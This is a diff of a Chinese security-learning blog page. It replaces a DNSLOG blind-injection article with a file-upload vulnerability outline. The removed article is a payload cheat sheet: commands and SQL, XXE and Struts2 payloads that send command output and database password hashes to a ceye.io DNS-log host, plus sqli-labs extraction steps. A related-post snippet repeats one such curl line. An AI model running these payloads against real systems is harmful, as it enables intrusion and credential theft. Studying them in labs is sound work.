@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      DNSLOG在盲注中的使用 | pidandoufu
+      文件上传 | pidandoufu
     
   </title>
   <meta name="author" content="pidandoufu">
@@ -160,7 +160,7 @@
 	<!-- Page title -->
 	<p>
 		
-			当前文章&nbsp;:&nbsp;《DNSLOG在盲注中的使用》
+			当前文章&nbsp;:&nbsp;《文件上传》
 		
 	</p>
 
@@ -277,8 +277,8 @@
 	<div class="article-title">
 		<i class="fa fa-paper-plane-o" aria-hidden="true"></i>
 		
-	<a href="/2019/04/15/DNSLOG在盲注中的使用/" itemprop="url">
-		DNSLOG在盲注中的使用
+	<a href="/2019/05/02/文件上传/" itemprop="url">
+		文件上传
 	</a>
 
 	</div>
@@ -291,9 +291,9 @@
 
 	发布于
 
-	<a href="/2019/04/15/DNSLOG在盲注中的使用/" itemprop="url">
-		<time datetime="2019-04-15T11:29:23.000Z" itemprop="datePublished">
-	  		2019-04-15
+	<a href="/2019/05/02/文件上传/" itemprop="url">
+		<time datetime="2019-05-02T15:49:45.000Z" itemprop="datePublished">
+	  		2019-05-02
 	  </time>
 	</a>
 	&nbsp;
@@ -309,9 +309,9 @@
 
 	更新于
 
-	<a href="/2019/04/15/DNSLOG在盲注中的使用/" itemprop="url">
-		<time datetime="2019-04-15T11:29:23.000Z" itemprop="dateUpdated">
-	  		2019-05-01
+	<a href="/2019/05/02/文件上传/" itemprop="url">
+		<time datetime="2019-05-02T15:49:45.000Z" itemprop="dateUpdated">
+	  		2019-05-03
 	  </time>
 	</a> 
 
@@ -322,8 +322,8 @@
 			<i class="fa fa-tags"></i>
 			
 	
-		<a href="/tags/盲注/" class=" ">
-			盲注
+		<a href="/tags/文件上传/" class=" ">
+			文件上传
 		</a>
 	
 		
@@ -332,7 +332,7 @@
 		
 
 	
-    <span class="leancloud_visitors" id="/2019/04/15/DNSLOG在盲注中的使用/_visitors" data-url="/2019/04/15/DNSLOG在盲注中的使用/" data-title="DNSLOG在盲注中的使用">
+    <span class="leancloud_visitors" id="/2019/05/02/文件上传/_visitors" data-url="/2019/05/02/文件上传/" data-title="文件上传">
        	<i class="fa fa-eye"></i>
        	热度
         <i class="leancloud_visitors_count" id="leancloud_visitors_count">0</i>
@@ -342,7 +342,7 @@
 
 
 	
-    <span class="leancloud_likes" id="/2019/04/15/DNSLOG在盲注中的使用/_likes" data-url="/2019/04/15/DNSLOG在盲注中的使用/" data-title="DNSLOG在盲注中的使用" rel="unlike">
+    <span class="leancloud_likes" id="/2019/05/02/文件上传/_likes" data-url="/2019/05/02/文件上传/" data-title="文件上传" rel="unlike">
         <i class="fa fa-heart"></i>
         喜欢
         <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
@@ -351,34 +351,58 @@
 	</div>
 
 	<div class="article-content" id="article-content">
-		<h1 id="DNSLOG在盲注中的使用"><a href="#DNSLOG在盲注中的使用" class="headerlink" title="DNSLOG在盲注中的使用"></a>DNSLOG在盲注中的使用</h1><h1 id="0x00-Command-Execution"><a href="#0x00-Command-Execution" class="headerlink" title="0x00 Command Execution"></a>0x00 Command Execution</h1><a id="more"></a>
-<h2 id="i-nix"><a href="#i-nix" class="headerlink" title="i. *nix:"></a>i. *nix:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.b182oj.ceye.io/`whoami`</span><br><span class="line">ping `whoami`.ip.port.b182oj.ceye.io</span><br></pre></td></tr></table></figure>
-<h2 id="ii-windows"><a href="#ii-windows" class="headerlink" title="ii. windows"></a>ii. windows</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.b182oj.ceye.io</span><br></pre></td></tr></table></figure>
-<h1 id="0x01-SQL-Injection"><a href="#0x01-SQL-Injection" class="headerlink" title="0x01 SQL Injection"></a>0x01 SQL Injection</h1><h2 id="i-SQL-Server"><a href="#i-SQL-Server" class="headerlink" title="i. SQL Server"></a>i. SQL Server</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">SELECT</span> @host=(<span class="keyword">SELECT</span> TOP <span class="number">1</span></span><br><span class="line">master.dbo.fn_varbintohexstr(password_hash)</span><br><span class="line"><span class="keyword">FROM</span> sys.sql_logins <span class="keyword">WHERE</span> <span class="keyword">name</span>=<span class="string">'sa'</span>)</span><br><span class="line">+<span class="string">'.ip.port.b182oj.ceye.io'</span>;</span><br><span class="line">EXEC('master..xp_dirtree</span><br><span class="line">"\\'+@host+'\foobar$"');</span><br></pre></td></tr></table></figure>
-<h2 id="ii-Oracle"><a href="#ii-Oracle" class="headerlink" title="ii. Oracle"></a>ii. Oracle</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.GET_HOST_ADDRESS(<span class="string">'ip.port.b182oj.ceye.io'</span>);</span><br><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST(<span class="string">'http://ip.port.b182oj.ceye.io/oracle'</span>) <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="keyword">SELECT</span> HTTPURITYPE(<span class="string">'http://ip.port.b182oj.ceye.io/oracle'</span>).GETCLOB() <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="keyword">SELECT</span> DBMS_LDAP.INIT((<span class="string">'oracle.ip.port.b182oj.ceye.io'</span>,<span class="number">80</span>) <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="keyword">SELECT</span> DBMS_LDAP.INIT((<span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> SYS.USER$ <span class="keyword">WHERE</span> <span class="keyword">name</span>=<span class="string">'SYS'</span>)||<span class="string">'.ip.port.b182oj.ceye.io'</span>,<span class="number">80</span>) <span class="keyword">FROM</span> DUAL;</span><br></pre></td></tr></table></figure>
-<h2 id="iii-MySQL"><a href="#iii-MySQL" class="headerlink" title="iii. MySQL"></a>iii. MySQL</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">'\\\\'</span>,(<span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span>=<span class="string">'root'</span> <span class="keyword">LIMIT</span> <span class="number">1</span>),<span class="string">'.mysql.ip.port.b182oj.ceye.io\\abc'</span>));</span><br></pre></td></tr></table></figure>
-<h2 id="iv-PostgreSQL"><a href="#iv-PostgreSQL" class="headerlink" title="iv. PostgreSQL"></a>iv. PostgreSQL</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> table_output;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_output(<span class="keyword">content</span> <span class="built_in">text</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> temp_function()</span><br><span class="line"><span class="keyword">RETURNS</span> <span class="built_in">VOID</span> <span class="keyword">AS</span> $</span><br><span class="line"><span class="keyword">DECLARE</span> exec_cmd <span class="built_in">TEXT</span>;</span><br><span class="line"><span class="keyword">DECLARE</span> query_result <span class="built_in">TEXT</span>;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">INTO</span> query_result (<span class="keyword">SELECT</span> passwd</span><br><span class="line"><span class="keyword">FROM</span> pg_shadow <span class="keyword">WHERE</span> usename=<span class="string">'postgres'</span>);</span><br><span class="line">exec_cmd := E'COPY table_output(content)</span><br><span class="line">FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\'';</span><br><span class="line"><span class="keyword">EXECUTE</span> exec_cmd;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$ LANGUAGE plpgsql SECURITY DEFINER;</span><br><span class="line"><span class="keyword">SELECT</span> temp_function();</span><br></pre></td></tr></table></figure>
-<h1 id="0x02-XML-Entity-Injection"><a href="#0x02-XML-Entity-Injection" class="headerlink" title="0x02 XML Entity Injection"></a>0x02 XML Entity Injection</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://ip.port.b182oj.ceye.io/xxe_test"&gt;</span></span><br><span class="line"><span class="meta">%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span></span><br></pre></td></tr></table></figure>
-<h1 id="0x03-Others"><a href="#0x03-Others" class="headerlink" title="0x03 Others"></a>0x03 Others</h1><h2 id="i-Struts2"><a href="#i-Struts2" class="headerlink" title="i. Struts2"></a>i. Struts2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx.action?redirect:http://ip.port.b182oj.ceye.io/%25&#123;3*4&#125;</span><br><span class="line">xx.action?redirect:$&#123;%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;&apos;whoami&apos;&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d&quot;http://ip.port.b182oj.ceye.io/result%3d&quot;.concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(&quot;GET&quot;),%23http.connect(),%23http.getInputStream()&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="ii-FFMpeg"><a href="#ii-FFMpeg" class="headerlink" title="ii. FFMpeg"></a>ii. FFMpeg</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXTINF:10.0,</span><br><span class="line">concat:http://ip.port.b182oj.ceye.io</span><br><span class="line">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>
-<p>iii. Weblogic</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxoo.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.b182oj.ceye.io/test&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Businesslocation&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
-<h2 id="iv-ImageMagick"><a href="#iv-ImageMagick" class="headerlink" title="iv. ImageMagick"></a>iv. ImageMagick</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(http://ip.port.b182oj.ceye.io)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
-<h2 id="v-Resin"><a href="#v-Resin" class="headerlink" title="v. Resin"></a>v. Resin</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.port.b182oj.ceye.io/ssrf</span><br></pre></td></tr></table></figure>
-<h2 id="vi-Discuz"><a href="#vi-Discuz" class="headerlink" title="vi. Discuz"></a>vi. Discuz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxxx.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://ip.port.b182oj.ceye.io/xx.jpg[/img]&amp;formhash=xxoo</span><br></pre></td></tr></table></figure>
-<h1 id="举例windows下mysql"><a href="#举例windows下mysql" class="headerlink" title="举例windows下mysql"></a>举例windows下mysql</h1><h3 id="step2-查询数据库名"><a href="#step2-查询数据库名" class="headerlink" title="step2:查询数据库名"></a>step2:查询数据库名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.lvkais.ceye.io\\abc&apos;))),1,1)--+</span><br></pre></td></tr></table></figure>
-<p><img src="/img/dns1.png" alt="img"></p>
-<h3 id="step3-查询当前数据库中的表"><a href="#step3-查询当前数据库中的表" class="headerlink" title="step3:查询当前数据库中的表"></a>step3:查询当前数据库中的表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select table_name from information_schema.columns  where table_schema=&apos;security&apos; limit 0,1),&apos;.lvkais.ceye.io\\abc&apos;))),1,1)--+</span><br></pre></td></tr></table></figure>
-<p><img src="/img/dns2.png" alt="img"></p>
-<h3 id="step4-查询表中的数据"><a href="#step4-查询表中的数据" class="headerlink" title="step4:查询表中的数据"></a>step4:查询表中的数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select column_name from information_schema.columns where table_schema=database()  and table_name=0x656d61696c73 limit 0,1),&apos;.lvkais.ceye.io\\abc&apos;))),1,1)--+</span><br></pre></td></tr></table></figure>
-<p><img src="/img/dns3.png" alt="img"></p>
-<h3 id="step5-获取字段名（写了三个，分别查和联和在一起查）"><a href="#step5-获取字段名（写了三个，分别查和联和在一起查）" class="headerlink" title="step5:获取字段名（写了三个，分别查和联和在一起查）"></a>step5:获取字段名（写了三个，分别查和联和在一起查）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select  username  from users limit 0,1),&apos;.lvkais.ceye.io\\abc&apos;))),1,1)--+</span><br></pre></td></tr></table></figure>
-<p><img src="/img/dns4.png" alt="img"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select password from users limit 0,1),&apos;.lvkais.ceye.io\\abc&apos;))),1,1)--+</span><br></pre></td></tr></table></figure>
-<p><img src="/img/dns5.png" alt="img"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select concat(username,0x5f,password) from users limit 0,1),&apos;.lvkais.ceye.io\\abc&apos;))),1,1)--+</span><br></pre></td></tr></table></figure>
-<p><img src="/img/dns6.png" alt="img"></p>
-<h3 id="step6-破解密码"><a href="#step6-破解密码" class="headerlink" title="step6:破解密码"></a>step6:破解密码</h3>	
+		<a id="more"></a>
+<h2 id="一、文件上传漏洞的原理："><a href="#一、文件上传漏洞的原理：" class="headerlink" title="一、文件上传漏洞的原理："></a>一、文件上传漏洞的原理：</h2><h4 id="由于文件上传功能实现代码没有严格限制用户上传的文件后缀以-及文件类型，导致攻击者能够向某个可通过-Web-访问的目录上传-恶意文件，并被脚本解析器执行，这样就可以在远程服务器上执-行恶意脚本"><a href="#由于文件上传功能实现代码没有严格限制用户上传的文件后缀以-及文件类型，导致攻击者能够向某个可通过-Web-访问的目录上传-恶意文件，并被脚本解析器执行，这样就可以在远程服务器上执-行恶意脚本" class="headerlink" title="由于文件上传功能实现代码没有严格限制用户上传的文件后缀以 及文件类型，导致攻击者能够向某个可通过 Web  访问的目录上传 恶意文件，并被脚本解析器执行，这样就可以在远程服务器上执 行恶意脚本"></a>由于文件上传功能实现代码没有严格限制用户上传的文件后缀以 及文件类型，导致攻击者能够向某个可通过 Web  访问的目录上传 恶意文件，并被脚本解析器执行，这样就可以在远程服务器上执 行恶意脚本</h4><h2 id="二、文件上传的"><a href="#二、文件上传的" class="headerlink" title="二、文件上传的"></a>二、文件上传的</h2><hr>
+<h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><ol>
+<li><h3 id="客户端检测绕过："><a href="#客户端检测绕过：" class="headerlink" title="客户端检测绕过："></a>客户端检测绕过：</h3><ul>
+<li><h6 id="主要是客户端JS绕过：主要是在上传文件图片马的时候，关闭浏览器的JS检测"><a href="#主要是客户端JS绕过：主要是在上传文件图片马的时候，关闭浏览器的JS检测" class="headerlink" title="主要是客户端JS绕过：主要是在上传文件图片马的时候，关闭浏览器的JS检测"></a>主要是客户端JS绕过：主要是在上传文件图片马的时候，关闭浏览器的JS检测</h6></li>
+</ul>
+<h5 id><a href="#" class="headerlink" title></a><img src="/img/1556840003271.png" alt="1556840003271"></h5></li>
+<li><h3 id="服务端检测绕过："><a href="#服务端检测绕过：" class="headerlink" title="服务端检测绕过："></a>服务端检测绕过：</h3><ul>
+<li><h4 id="检查后缀："><a href="#检查后缀：" class="headerlink" title="检查后缀："></a>检查后缀：</h4><ol>
+<li><h5 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h5><ul>
+<li><h6 id="1-上传特殊可解析后缀"><a href="#1-上传特殊可解析后缀" class="headerlink" title="1.上传特殊可解析后缀"></a>1.上传特殊可解析后缀</h6></li>
+<li><h6 id="上传-htaccess"><a href="#上传-htaccess" class="headerlink" title="上传.htaccess"></a>上传.htaccess</h6></li>
+<li><h6 id="后缀大小写绕过"><a href="#后缀大小写绕过" class="headerlink" title="后缀大小写绕过"></a>后缀大小写绕过</h6></li>
+<li><h6 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h6></li>
+<li><h6 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h6></li>
+<li><h6 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h6></li>
+<li><h6 id="配合解析漏洞"><a href="#配合解析漏洞" class="headerlink" title="配合解析漏洞"></a>配合解析漏洞</h6><ol>
+<li>Apache陌生后缀解析漏洞</li>
+<li>Apache换行解析漏洞</li>
+</ol>
+</li>
+<li><h6 id="双后缀名绕过"><a href="#双后缀名绕过" class="headerlink" title="双后缀名绕过"></a>双后缀名绕过</h6></li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+</ol>
+<pre><code>2. ##### 白名单
+
+   1. ###### MIME绕过
+
+   2. ###### %00截断
+
+   3. ###### 0x00截断
+
+------
+</code></pre><ul>
+<li><h4 id="检查内容"><a href="#检查内容" class="headerlink" title="检查内容"></a>检查内容</h4><ol>
+<li><h5 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h5></li>
+<li><h5 id="突破getmagesize"><a href="#突破getmagesize" class="headerlink" title="突破getmagesize()"></a>突破getmagesize()</h5></li>
+<li><h5 id="突破exif-imagetype"><a href="#突破exif-imagetype" class="headerlink" title="突破exif_imagetype()"></a>突破exif_imagetype()</h5></li>
+<li><h5 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h5></li>
+</ol>
+<hr>
+</li>
+</ul>
+<ul>
+<li><h4 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h4><h5 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h5></li>
+</ul>
+	
 	</div>
 	
 	<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>
@@ -396,12 +420,8 @@
 	<span>
 		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
 		
-			<a href="/2019/04/28/文件上传的七种姿势/" title="文件包含漏洞" rel="prev">
-				&laquo;上一篇
-			</a>
 		
-		
-			<a href="/2019/04/14/sql注入-二/" title="sql注入(二)" rel="next">
+			<a href="/2019/04/28/一句话木马及变形/" title="一句话木马及变形" rel="next">
 				下一篇&raquo;
 			</a>
 			
@@ -419,6 +439,79 @@
 <div class="relate-post">
 	
 		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/04/28/一句话木马及变形/" title="一句话木马及变形">
+								一句话木马及变形			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 28日, 2019				
+							</p>
+							<p class="relate-post-content">
+								一句话木马变形
+介绍：网站后门，也可以叫做WebShell，黑客在入侵了一个网站后，通常会将一些asp或php文件与网 站服务器WEB目录下正常的网页文件混在一起，使得可以通过使用浏览器来访问这些asp或者php 文件，从而得到一个命...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/04/28/一句话木马及变形/" title="一句话木马及变形">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="一句话木马及变形">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/04/28/文件上传的七种姿势/" title="文件包含漏洞">
+								文件包含漏洞			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 28日, 2019				
+							</p>
+							<p class="relate-post-content">
+								
+文件包含的漏洞形成
+文件包含就是代码注入的典型代表，PHP的文件包含可以直接执行包含文件的代码，而且包含文件的格式是不受限制的，因此如果我们在包含文件中输入恶意代码，就会导致文件包含漏洞，文件包含漏洞大多可以直接利用获取webshe...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/04/28/文件上传的七种姿势/" title="文件包含漏洞">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="文件包含漏洞">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/04/15/DNSLOG在盲注中的使用/" title="DNSLOG在盲注中的使用">
+								DNSLOG在盲注中的使用			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 15日, 2019				
+							</p>
+							<p class="relate-post-content">
+								DNSLOG在盲注中的使用0x00 Command Execution
+i. *nix:12curl http://ip.port.b182oj.ceye.io/`whoami`ping `whoami`.ip.port.b182oj...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/04/15/DNSLOG在盲注中的使用/" title="DNSLOG在盲注中的使用">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="DNSLOG在盲注中的使用">
+							</a>
+						</div>
+					</li>											
+			
 			
 					<li>
 						<div class="relate-post-text">
@@ -479,80 +572,6 @@
 							<a href="/2019/04/11/sql注入/" title="sql注入(一)">				
 								
 								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="sql注入(一)">
-							</a>
-						</div>
-					</li>											
-			
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2019/05/02/文件上传/" title="文件上传">
-								文件上传			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								五月 2日, 2019				
-							</p>
-							<p class="relate-post-content">
-								
-一、文件上传漏洞的原理：由于文件上传功能实现代码没有严格限制用户上传的文件后缀以 及文件类型，导致攻击者能够向某个可通过 Web  访问的目录上传 恶意文件，并被脚本解析器执行，这样就可以在远程服务器上执 行恶意脚本二、文件上传的
-...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2019/05/02/文件上传/" title="文件上传">				
-								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="文件上传">
-							</a>
-						</div>
-					</li>											
-			
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2019/04/28/一句话木马及变形/" title="一句话木马及变形">
-								一句话木马及变形			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								四月 28日, 2019				
-							</p>
-							<p class="relate-post-content">
-								一句话木马变形
-介绍：网站后门，也可以叫做WebShell，黑客在入侵了一个网站后，通常会将一些asp或php文件与网 站服务器WEB目录下正常的网页文件混在一起，使得可以通过使用浏览器来访问这些asp或者php 文件，从而得到一个命...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2019/04/28/一句话木马及变形/" title="一句话木马及变形">				
-								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="一句话木马及变形">
-							</a>
-						</div>
-					</li>											
-			
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2019/04/28/文件上传的七种姿势/" title="文件包含漏洞">
-								文件包含漏洞			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								四月 28日, 2019				
-							</p>
-							<p class="relate-post-content">
-								
-文件包含的漏洞形成
-文件包含就是代码注入的典型代表，PHP的文件包含可以直接执行包含文件的代码，而且包含文件的格式是不受限制的，因此如果我们在包含文件中输入恶意代码，就会导致文件包含漏洞，文件包含漏洞大多可以直接利用获取webshe...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2019/04/28/文件上传的七种姿势/" title="文件包含漏洞">				
-								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="文件包含漏洞">
 							</a>
 						</div>
 					</li>											
